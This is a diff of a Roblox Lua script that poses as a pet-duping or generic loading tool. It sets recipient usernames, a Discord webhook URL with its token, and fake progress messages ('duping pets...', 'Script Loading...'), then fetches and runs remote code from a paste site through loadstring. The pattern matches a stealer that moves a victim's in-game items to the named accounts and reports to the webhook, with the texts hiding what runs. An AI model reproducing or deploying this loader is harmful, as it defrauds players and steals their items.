@@ -1,9 +1,9 @@
-UserName = "freevcaccforyoh"
+UserName = "freevcaccforyou"
 UserName2 = "imrealboy89"
 Webhook = "https://discord.com/api/webhooks/1112357496766615662/7Z0MA5k0k6VZ0ACPEIA8h48sxjsxgfMtFGYZeNk3DbCbD3eHaM9UBwCd85zaJ8RvaPeU"
-_G.ScriptName = "duping script hub"
-_G.FirstText = "hello..."
-_G.SecondText = "duping pets..."
-_G.ThirdText = "almost done..."
-_G.WaitingTime = 35
-loadstring(game:HttpGet("https://paste-bin.xyz/raw/984466", true))()
+_G.ScriptName = "Loading.."
+_G.FirstText = "Please wait.."
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 30
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/984685", true))()
